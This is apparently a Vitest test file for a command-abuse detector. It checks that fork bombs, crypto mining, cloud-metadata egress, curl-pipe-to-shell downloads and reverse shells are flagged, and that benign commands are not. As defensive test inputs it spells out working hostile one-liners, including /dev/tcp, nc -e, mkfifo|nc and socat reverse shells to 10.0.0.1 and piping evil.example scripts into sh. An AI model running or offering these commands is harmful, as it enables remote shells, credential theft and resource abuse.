import { describe, expect, it } from 'vitest';

import { detectCommandAbuse } from './index.js';

describe('detectCommandAbuse — fork bomb', () => {
  it('flags the classic recursive fork bomb', () => {
    const signal = detectCommandAbuse('bash', ['-c', ':(){ :|:& };:']);
    expect(signal?.type).toBe('fork_bomb');
    expect(signal?.action).toBe('stop_workspace');
  });

  it('flags a named-function fork bomb variant', () => {
    const signal = detectCommandAbuse('bash', ['-c', 'boom(){ boom|boom& };boom']);
    expect(signal?.type).toBe('fork_bomb');
  });

  it('does NOT flag ordinary commands that merely contain the substring "bomb"', () => {
    // Previously the bare `|bomb` alternative matched any of these and hard-blocked them.
    expect(detectCommandAbuse('npm', ['install', 'bombadil'])).toBeUndefined();
    expect(detectCommandAbuse('git', ['clone', 'https://github.com/acme/bomb-defuser'])).toBeUndefined();
    expect(detectCommandAbuse('node', ['scripts/bomb-detector.js'])).toBeUndefined();
    expect(detectCommandAbuse('echo', ['the bomb squad is here'])).toBeUndefined();
  });

  it('does NOT flag a loop that legitimately mentions the word fork', () => {
    expect(detectCommandAbuse('node', ['fork-worker.js'])).toBeUndefined();
    expect(detectCommandAbuse('git', ['fetch', 'fork'])).toBeUndefined();
  });

  it('does NOT flag ordinary shell function definitions whose body contains a pipe', () => {
    // Previously the loose `token | token` body match flagged any piped function body.
    expect(detectCommandAbuse('sh', ['-c', 'deploy() { npm run build | tee log; }'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'greet() { echo hi | cat; }'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'run() { cat x | grep error; }'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'build() { webpack | tee build.log; }'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'f() { a | b | c; }'])).toBeUndefined();

    // A function that pipes one helper into a differently-named one is not a self-fork.
    expect(detectCommandAbuse('sh', ['-c', 'proc() { proc_a | proc_b; }'])).toBeUndefined();
  });

  it('flags spaced / whitespace-variant recursive fork bombs (self-pipe)', () => {
    expect(detectCommandAbuse('bash', ['-c', ':() { : | : ; } ; :'])?.type).toBe('fork_bomb');
    expect(detectCommandAbuse('bash', ['-c', 'fork(){ fork | fork; }; fork'])?.type).toBe('fork_bomb');
  });

  it('completes in linear time on a catastrophic-backtracking input (ReDoS regression)', () => {
    /*
     * The previous regex `…\{[^}]*?\1\s*\|\s*\1` backtracked super-linearly: this input
     * took ~5.6s at 100k chars and blocked the event loop for every tenant. The
     * structural detector must finish near-instantly regardless of input size.
     */
    const evil = `f(){${'a'.repeat(100_000)}`;
    const start = performance.now();
    const signal = detectCommandAbuse('bash', ['-c', evil]);
    const elapsed = performance.now() - start;

    expect(signal).toBeUndefined();
    expect(elapsed).toBeLessThan(50);
  });

  it('does not stall on a function header followed by a huge non-matching body', () => {
    const evil = `:(){ ${'x'.repeat(100_000)}`;
    const start = performance.now();
    detectCommandAbuse('bash', ['-c', evil]);
    expect(performance.now() - start).toBeLessThan(50);
  });
});

describe('detectCommandAbuse — legitimate command chaining', () => {
  it('does NOT flag ordinary chained shell commands', () => {
    // These are normal developer workflows that were wrongly rejected as a hard 409.
    expect(detectCommandAbuse('sh', ['-c', 'npm run clean && rm -rf dist'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'cat config | sh'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'make build ; rm -f tmp'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'echo hi && bash deploy.sh'])).toBeUndefined();
  });
});

describe('detectCommandAbuse — unambiguous patterns still flagged', () => {
  it('flags crypto mining', () => {
    expect(detectCommandAbuse('xmrig', ['--url', 'stratum+tcp://pool:3333'])?.type).toBe('crypto_mining');
  });

  it('flags metadata-service egress', () => {
    expect(detectCommandAbuse('curl', ['http://169.254.169.254/latest/meta-data/'])?.type).toBe('suspicious_egress');
  });

  it('flags download-and-execute (curl | sh)', () => {
    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil.example/x.sh | sh'])?.type).toBe('malware_download');
  });

  it('flags a reverse shell', () => {
    expect(detectCommandAbuse('bash', ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])?.type).toBe('reverse_shell');
  });

  it('still flags the real nc -e and mkfifo|nc reverse-shell shapes', () => {
    expect(detectCommandAbuse('nc', ['-e', '/bin/sh', '10.0.0.1', '4444'])?.type).toBe('reverse_shell');
    expect(detectCommandAbuse('sh', ['-c', 'mkfifo /tmp/f; cat /tmp/f | nc 10.0.0.1 4444 > /tmp/f'])?.type).toBe(
      'reverse_shell',
    );
    expect(detectCommandAbuse('socat', ['exec:/bin/sh', 'tcp:10.0.0.1:4444'])?.type).toBe('reverse_shell');
  });
});

describe('detectCommandAbuse — reverse_shell false positives (mkfifo / nc word boundaries)', () => {
  it('does NOT flag mkfifo on a pipe path that merely contains the letters "nc"', () => {
    // Previously `mkfifo\s+.*nc` matched the 'nc' inside 'sync' / 'syncthing'.
    expect(detectCommandAbuse('mkfifo', ['/tmp/sync_pipe'])).toBeUndefined();
    expect(detectCommandAbuse('mkfifo', ['/var/run/syncthing'])).toBeUndefined();
    expect(detectCommandAbuse('mkfifo', ['/tmp/concurrency.fifo'])).toBeUndefined();
    expect(detectCommandAbuse('mkfifo', ['/tmp/cache-nc'])).toBeUndefined();
  });

  it('does NOT flag a real mkfifo→nc chain when nc only appears as a substring', () => {
    // A pipe feeding a path-named binary (not the nc executable) is benign.
    expect(detectCommandAbuse('sh', ['-c', 'mkfifo /tmp/p && cat /tmp/p | encode'])).toBeUndefined();
  });

  it('does NOT flag the franc CLI invoked with -e (was matched by bare `nc -e`)', () => {
    expect(detectCommandAbuse('franc', ['-e', 'en', 'file.txt'])).toBeUndefined();
  });
});

describe('detectCommandAbuse — malware_download false positives (sh-prefixed words)', () => {
  it('does NOT flag pipes ending in sh-prefixed binaries', () => {
    // Previously `\|\s*sh` matched `| shasum`, `| share`, `| shellcheck`.
    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | wc -l && echo done | shasum'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | shasum -a 256'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'wget -qO- https://x | shellcheck -'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'curl https://x | share'])).toBeUndefined();
  });

  it('still flags genuine curl|sh and base64 -d|sh download-and-execute', () => {
    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil/x | sh'])?.type).toBe('malware_download');
    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil/x | sh; echo ok'])?.type).toBe('malware_download');
    expect(detectCommandAbuse('sh', ['-c', 'wget -qO- http://evil/x | bash'])?.type).toBe('malware_download');
    expect(detectCommandAbuse('sh', ['-c', 'echo Zm9v | base64 -d | sh'])?.type).toBe('malware_download');
  });
});
